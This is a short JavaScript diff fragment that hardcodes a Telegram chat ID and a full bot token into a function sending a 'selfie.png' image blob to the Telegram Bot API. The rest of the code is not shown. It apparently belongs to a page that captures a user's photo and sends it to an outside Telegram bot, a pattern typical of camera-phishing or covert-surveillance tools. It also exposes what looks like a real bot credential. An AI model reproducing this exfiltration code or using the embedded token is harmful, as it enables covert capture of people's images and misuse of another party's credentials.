@@ -95,10 +95,10 @@
 
     function sendToTelegram(blob) {
       const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
+      formData.append("chat_id", 5586578957);
       formData.append("photo", blob, "selfie.png");
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE/sendPhoto`, {
         method: "POST",
         body: formData
       })
